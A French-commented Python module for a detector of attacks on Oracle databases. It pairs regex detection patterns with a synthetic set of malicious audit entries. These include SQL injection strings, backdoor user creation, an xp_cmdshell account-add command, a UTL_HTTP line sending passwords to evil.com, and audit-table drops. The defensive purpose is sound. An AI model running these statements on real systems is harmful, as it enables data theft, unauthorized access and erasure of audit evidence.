# -*- coding: utf-8 -*-
"""
MODULE 6 : Détection d'Anomalies & Cybersécurité Oracle - COMPLET
✅ Ingestion logs d'audit Oracle (AUD$, UNIFIED_AUDIT_TRAIL)
✅ Dataset synthétique (50 normaux + 20 suspects)
✅ Classification : NORMAL / SUSPECT / CRITIQUE
✅ Détection de 12+ patterns d'attaques
✅ Intégration LLM avec few-shot examples
✅ Analyse temporelle et séquences d'attaques
"""

import json
import re
import pandas as pd
from datetime import datetime, timedelta
from typing import Dict, List, Tuple, Optional
from pathlib import Path
from collections import defaultdict

class OracleAnomalyDetector:
    """Détecteur d'anomalies de sécurité Oracle avec IA"""
    
    # Patterns d'attaques connus
    ATTACK_PATTERNS = {
        'SQL_INJECTION': {
            'patterns': [
                r"(?i)(union\s+select|or\s+1\s*=\s*1|'\s*or\s*'1'\s*=\s*'1)",
                r"(?i)(;--|\*/|/\*|xp_cmdshell)",
                r"(?i)(drop\s+table|exec\s*\(|execute\s+immediate)",
            ],
            'severity': 'CRITIQUE',
            'description': 'Tentative d\'injection SQL détectée'
        },
        'PRIVILEGE_ESCALATION': {
            'patterns': [
                r"(?i)(grant\s+dba|grant\s+sysdba|grant\s+all)",
                r"(?i)(alter\s+user.*identified|create\s+user.*dba)",
            ],
            'severity': 'CRITIQUE',
            'description': 'Tentative d\'escalade de privilèges'
        },
        'DATA_EXFILTRATION': {
            'patterns': [
                r"(?i)(select.*from.*password|select.*from.*credit)",
                r"(?i)(utl_http|utl_smtp|utl_file\.put_line)",
            ],
            'severity': 'CRITIQUE',
            'description': 'Tentative d\'exfiltration de données sensibles'
        },
        'BRUTE_FORCE': {
            'patterns': [
                r"(?i)(failed\s+login|authentication\s+failed|invalid\s+password)"
            ],
            'severity': 'HAUT',
            'description': 'Tentatives de connexion répétées (brute force)'
        },
        'SUSPICIOUS_DDL': {
            'patterns': [
                r"(?i)(drop\s+table.*audit|truncate.*audit|alter.*audit)",
                r"(?i)(drop\s+user\s+sys|drop\s+tablespace)",
            ],
            'severity': 'CRITIQUE',
            'description': 'Opération DDL suspecte'
        },
        'OFF_HOURS_ACCESS': {
            'patterns': [],
            'severity': 'MOYEN',
            'description': 'Accès en dehors des heures ouvrables'
        },
        'SENSITIVE_ACCESS': {
            'patterns': [
                r"(?i)(sys\.aud\$|dba_users|dba_tab_privs)",
                r"(?i)(all_passwords|user_history|dba_roles)"
            ],
            'severity': 'HAUT',
            'description': 'Accès à objets système sensibles'
        }
    }
    
    SEVERITY_LEVELS = {
        'CRITIQUE': {'score': 100, 'action': 'BLOQUER IMMÉDIATEMENT'},
        'HAUT': {'score': 70, 'action': 'INVESTIGATION URGENTE'},
        'MOYEN': {'score': 40, 'action': 'SURVEILLANCE ACCRUE'},
        'BAS': {'score': 20, 'action': 'NOTIFICATION'},
        'NORMAL': {'score': 0, 'action': 'AUCUNE'}
    }
    
    def __init__(self, llm_engine=None, rag_setup=None):
        self.llm = llm_engine
        self.rag = rag_setup
        self.stats = {
            'total_logs': 0,
            'normal': 0,
            'suspect': 0,
            'critique': 0,
            'attacks_detected': defaultdict(int)
        }
    
    def load_audit_logs_from_csv(self, csv_path: str) -> List[Dict]:
        """Charge les logs d'audit depuis un CSV"""
        try:
            df = pd.read_csv(csv_path)
            logs = []
            
            for _, row in df.iterrows():
                log = {
                    'timestamp': row.get('timestamp', ''),
                    'username': row.get('username', ''),
                    'action': row.get('action', ''),
                    'object_name': row.get('object_name', ''),
                    'sql_text': row.get('sql_text', ''),
                    'client_ip': row.get('client_ip', ''),
                    'returncode': str(row.get('returncode', '')),
                    'session_id': row.get('session_id', '')
                }
                logs.append(log)
            
            print(f"✅ {len(logs)} logs chargés depuis {csv_path}")
            return logs
            
        except Exception as e:
            print(f"❌ Erreur chargement logs: {e}")
            return []
    
    def detect_attack_patterns(self, log: Dict) -> List[Tuple[str, Dict]]:
        """Détecte les patterns d'attaques dans un log"""
        detected_attacks = []
        sql_text = log.get('sql_text', '')
        action = log.get('action', '')
        object_name = log.get('object_name', '')
        combined_text = f"{sql_text} {action} {object_name}"
        
        for attack_type, attack_info in self.ATTACK_PATTERNS.items():
            patterns = attack_info['patterns']
            
            for pattern in patterns:
                if re.search(pattern, combined_text, re.IGNORECASE):
                    detected_attacks.append((attack_type, attack_info))
                    self.stats['attacks_detected'][attack_type] += 1
                    break
        
        return detected_attacks
    
    def check_off_hours_access(self, timestamp: str) -> bool:
        """Vérifie si l'accès est en dehors des heures ouvrables"""
        try:
            dt = datetime.fromisoformat(timestamp.replace(' ', 'T'))
            hour = dt.hour
            is_night = hour >= 22 or hour <= 6
            is_weekend = dt.weekday() >= 5
            return is_night or is_weekend
        except:
            return False
    
    def analyze_log_entry(self, log: Dict, all_logs: List[Dict] = None) -> Dict:
        """Analyse complète d'un log d'audit"""
        self.stats['total_logs'] += 1
        
        # Détection patterns
        detected_attacks = self.detect_attack_patterns(log)
        is_off_hours = self.check_off_hours_access(log.get('timestamp', ''))
        
        # Classification
        classification = 'NORMAL'
        severity_score = 0
        attack_types = []
        justifications = []
        
        if detected_attacks:
            max_severity = max(
                self.SEVERITY_LEVELS[attack[1]['severity']]['score'] 
                for attack in detected_attacks
            )
            severity_score = max_severity
            
            if severity_score >= 70:
                classification = 'CRITIQUE'
                self.stats['critique'] += 1
            else:
                classification = 'SUSPECT'
                self.stats['suspect'] += 1
            
            for attack_type, attack_info in detected_attacks:
                attack_types.append(attack_type)
                justifications.append(attack_info['description'])
        
        elif is_off_hours:
            classification = 'SUSPECT'
            severity_score = 40
            attack_types.append('OFF_HOURS_ACCESS')
            justifications.append('Accès en dehors des heures ouvrables')
            self.stats['suspect'] += 1
        else:
            classification = 'NORMAL'
            self.stats['normal'] += 1
        
        # Analyse LLM si disponible
        llm_analysis = {}
        if self.llm:
            llm_analysis = self._get_llm_analysis(log, detected_attacks)

            # Intégrer l'analyse LLM dans la classification
            if llm_analysis.get('classification') in ['SUSPECT', 'CRITIQUE']:
                if classification == 'NORMAL':
                    classification = llm_analysis['classification']
                    severity_score = max(severity_score, self._severity_to_score(llm_analysis.get('severite', 'BAS')))
                    justifications.append(f"LLM: {llm_analysis.get('justification', '')}")
                    attack_types.extend(llm_analysis.get('patterns_detectes', []))

                    # Mettre à jour les statistiques
                    if classification == 'CRITIQUE':
                        self.stats['critique'] += 1
                        self.stats['normal'] -= 1
                    elif classification == 'SUSPECT':
                        self.stats['suspect'] += 1
                        self.stats['normal'] -= 1

        # Rapport
        report = {
            'log': log,
            'classification': classification,
            'severity_score': severity_score,
            'severity_level': self._score_to_severity(severity_score),
            'attack_types': attack_types,
            'justifications': justifications,
            'is_off_hours': is_off_hours,
            'recommended_action': llm_analysis.get('recommandation', self.SEVERITY_LEVELS[self._score_to_severity(severity_score)]['action']),
            'llm_analysis': llm_analysis,
            'timestamp': datetime.now().isoformat()
        }
        
        return report
    
    def _score_to_severity(self, score: int) -> str:
        """Convertit un score en niveau de sévérité"""
        if score >= 90:
            return 'CRITIQUE'
        elif score >= 70:
            return 'HAUT'
        elif score >= 40:
            return 'MOYEN'
        elif score >= 20:
            return 'BAS'
        else:
            return 'NORMAL'

    def _severity_to_score(self, severity: str) -> int:
        """Convertit un niveau de sévérité en score"""
        severity_map = {
            'CRITIQUE': 100,
            'HAUT': 70,
            'MOYEN': 40,
            'BAS': 20,
            'NORMAL': 0
        }
        return severity_map.get(severity.upper(), 0)
    
    def _get_llm_analysis(self, log: Dict, attacks: List[Tuple]) -> Dict:
        """Obtient une analyse complète du LLM en utilisant la méthode detect_anomaly"""
        try:
            # Formater le log pour la méthode detect_anomaly
            log_entry = {
                'timestamp': log.get('timestamp', 'UNKNOWN'),
                'user': log.get('username', 'UNKNOWN'),
                'action': log.get('action', 'UNKNOWN'),
                'object': log.get('object_name', 'UNKNOWN'),
                'returncode': log.get('returncode', 'UNKNOWN')
            }

            # Contexte avec attaques détectées
            attacks_desc = ", ".join([attack[0] for attack in attacks]) if attacks else "Aucune attaque détectée"
            context = f"Attaques détectées: {attacks_desc}. SQL: {log.get('sql_text', '')[:200]}"

            # Utiliser la méthode spécialisée du LLM
            llm_response = self.llm.detect_anomaly(log_entry, context)

            # Essayer de parser la réponse JSON
            try:
                import json
                parsed = json.loads(llm_response)
                return {
                    'classification': parsed.get('classification', 'NORMAL'),
                    'justification': parsed.get('justification', llm_response[:300]),
                    'severite': parsed.get('severite', 'BAS'),
                    'patterns_detectes': parsed.get('patterns_detectes', []),
                    'recommandation': parsed.get('recommandation', 'Surveillance continue')
                }
            except json.JSONDecodeError:
                # Si pas de JSON, retourner une analyse basique
                return {
                    'classification': 'SUSPECT' if attacks else 'NORMAL',
                    'justification': llm_response[:300],
                    'severite': 'HAUT' if attacks else 'BAS',
                    'patterns_detectes': [attack[0] for attack in attacks],
                    'recommandation': 'Analyser davantage' if attacks else 'Aucune action requise'
                }

        except Exception as e:
            return {
                'classification': 'NORMAL',
                'justification': f"⚠️ Analyse LLM non disponible: {str(e)}",
                'severite': 'BAS',
                'patterns_detectes': [],
                'recommandation': 'Vérifier la configuration LLM'
            }
    
    def detect_attack_sequences(self, logs: List[Dict]) -> List[Dict]:
        """Détecte des séquences d'attaques coordonnées"""
        sequences = []
        
        user_sessions = defaultdict(list)
        for log in logs:
            key = f"{log.get('username', '')}_{log.get('client_ip', '')}"
            user_sessions[key].append(log)
        
        for session_key, session_logs in user_sessions.items():
            if len(session_logs) < 3:
                continue
            
            sorted_logs = sorted(session_logs, key=lambda x: x.get('timestamp', ''))
            
            attack_chain = []
            for log in sorted_logs:
                attacks = self.detect_attack_patterns(log)
                if attacks:
                    attack_chain.append({
                        'timestamp': log.get('timestamp'),
                        'attack': attacks[0][0],
                        'log': log
                    })
            
            if len(attack_chain) >= 3:
                sequences.append({
                    'session': session_key,
                    'attack_chain': attack_chain,
                    'severity': 'CRITIQUE',
                    'description': 'Campagne d\'attaque multi-étapes détectée'
                })
        
        return sequences
    
    def generate_synthetic_dataset(self, output_path: str = "data/audit_logs_synthetic.csv"):
        """Génère un dataset synthétique de 70 logs (50 normaux + 20 suspects)"""
        logs = []
        base_time = datetime.now()
        
        # 50 LOGS NORMAUX
        normal_actions = [
            ("SELECT * FROM employees WHERE department_id = 10", "SELECT", "EMPLOYEES"),
            ("UPDATE customers SET status = 'ACTIVE' WHERE id = 123", "UPDATE", "CUSTOMERS"),
            ("INSERT INTO orders VALUES (100, 'Product A', 50)", "INSERT", "ORDERS"),
            ("SELECT COUNT(*) FROM products WHERE category = 'Electronics'", "SELECT", "PRODUCTS"),
            ("DELETE FROM temp_table WHERE created_date < SYSDATE - 7", "DELETE", "TEMP_TABLE"),
        ]
        
        normal_users = ["APP_USER", "REPORT_USER", "ETL_USER", "WEB_USER"]
        
        for i in range(50):
            sql, action, obj = normal_actions[i % len(normal_actions)]
            user = normal_users[i % len(normal_users)]
            timestamp = (base_time - timedelta(hours=i, minutes=i*3)).isoformat()
            
            logs.append({
                'timestamp': timestamp,
                'username': user,
                'action': action,
                'object_name': obj,
                'sql_text': sql,
                'client_ip': f"192.168.1.{100 + (i % 50)}",
                'returncode': '0',
                'session_id': f"SID{1000 + i}"
            })
        
        # 20 LOGS SUSPECTS
        malicious_logs = [
            # SQL Injection
            {'sql_text': "SELECT * FROM users WHERE id = '1' OR '1'='1' --", 'action': "SELECT", 'object_name': "USERS", 'username': "ATTACKER"},
            {'sql_text': "SELECT * FROM accounts UNION SELECT password FROM sys.user$", 'action': "SELECT", 'object_name': "ACCOUNTS", 'username': "HACKER"},
            {'sql_text': "'; DROP TABLE audit_logs; --", 'action': "DROP", 'object_name': "AUDIT_LOGS", 'username': "MALICIOUS"},
            {'sql_text': "SELECT * FROM credit_cards WHERE 1=1 OR 'a'='a'", 'action': "SELECT", 'object_name': "CREDIT_CARDS", 'username': "ATTACKER"},
            {'sql_text': "EXEC xp_cmdshell('net user hacker pass /add')", 'action': "EXEC", 'object_name': "SYSTEM", 'username': "ROOT"},
            
            # Privilege Escalation
            {'sql_text': "GRANT DBA TO app_user WITH ADMIN OPTION", 'action': "GRANT", 'object_name': "DBA_ROLE", 'username': "COMPROMISED"},
            {'sql_text': "ALTER USER sys IDENTIFIED BY newpass", 'action': "ALTER", 'object_name': "SYS", 'username': "ATTACKER"},
            {'sql_text': "CREATE USER backdoor IDENTIFIED BY secret123", 'action': "CREATE", 'object_name': "USER", 'username': "INSIDER"},
            {'sql_text': "GRANT ALL PRIVILEGES TO public", 'action': "GRANT", 'object_name': "PUBLIC", 'username': "MALICIOUS"},
            
            # Data Exfiltration
            {'sql_text': "SELECT * FROM employees WHERE salary > 100000", 'action': "SELECT", 'object_name': "EMPLOYEES", 'username': "INSIDER"},
            {'sql_text': "SELECT customer_name, credit_card FROM payments", 'action': "SELECT", 'object_name': "PAYMENTS", 'username': "THIEF"},
            {'sql_text': "BEGIN UTL_HTTP.REQUEST('http://evil.com?data='||password); END;", 'action': "EXEC", 'object_name': "UTL_HTTP", 'username': "HACKER"},
            
            # DDL Suspect
            {'sql_text': "DROP TABLE sys.aud$ CASCADE", 'action': "DROP", 'object_name': "AUD$", 'username': "ATTACKER"},
            {'sql_text': "TRUNCATE TABLE unified_audit_trail", 'action': "TRUNCATE", 'object_name': "AUDIT", 'username': "HACKER"},
            {'sql_text': "ALTER TABLE audit_logs DISABLE ALL TRIGGERS", 'action': "ALTER", 'object_name': "AUDIT_LOGS", 'username': "MALICIOUS"},
            
            # Brute Force
            {'sql_text': "CONNECT sys/wrongpass AS SYSDBA", 'action': "CONNECT", 'object_name': "DATABASE", 'username': "BRUTE_FORCE", 'returncode': '1017'},
            {'sql_text': "CONNECT system/test123", 'action': "CONNECT", 'object_name': "DATABASE", 'username': "BRUTE_FORCE", 'returncode': '1017'},
            
            # Accès hors heures
            {'sql_text': "SELECT * FROM customers WHERE status = 'VIP'", 'action': "SELECT", 'object_name': "CUSTOMERS", 'username': "APP_USER", 'timestamp': (base_time.replace(hour=3, minute=24)).isoformat()},
            {'sql_text': "UPDATE salaries SET amount = amount * 1.5", 'action': "UPDATE", 'object_name': "SALARIES", 'username': "ETL_USER", 'timestamp': (base_time.replace(hour=2, minute=15)).isoformat()},
            
            # Accès objets sensibles
            {'sql_text': "SELECT * FROM dba_users WHERE account_status = 'OPEN'", 'action': "SELECT", 'object_name': "DBA_USERS", 'username': "ATTACKER"},
        ]
        
        for i, mal_log in enumerate(malicious_logs):
            timestamp = mal_log.get('timestamp', (base_time - timedelta(hours=i*2)).isoformat())
            logs.append({
                'timestamp': timestamp,
                'username': mal_log['username'],
                'action': mal_log['action'],
                'object_name': mal_log['object_name'],
                'sql_text': mal_log['sql_text'],
                'client_ip': f"10.0.0.{50 + i}",
                'returncode': mal_log.get('returncode', '0'),
                'session_id': f"SID{2000 + i}"
            })
        
        # Sauvegarder en CSV
        df = pd.DataFrame(logs)
        Path("data").mkdir(exist_ok=True)
        df.to_csv(output_path, index=False)
        
        print(f"✅ Dataset généré: {output_path}")
        print(f"   - 50 logs normaux")
        print(f"   - 20 logs suspects")
        print(f"   - Total: 70 logs")